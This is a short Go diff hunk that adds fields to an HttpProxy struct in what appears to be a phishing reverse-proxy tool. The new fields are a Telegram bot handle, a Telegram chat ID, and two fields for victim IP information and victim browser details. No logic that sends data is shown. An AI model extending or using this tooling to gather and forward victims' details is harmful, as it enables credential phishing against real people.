@@ -82,6 +82,10 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	telegram_bot      *tgbotapi.BotAPI
+	telegram_chat_id  int64
+	victimIpInfo      string
+	victimBrowser     string
 }
 
 type ProxySession struct {
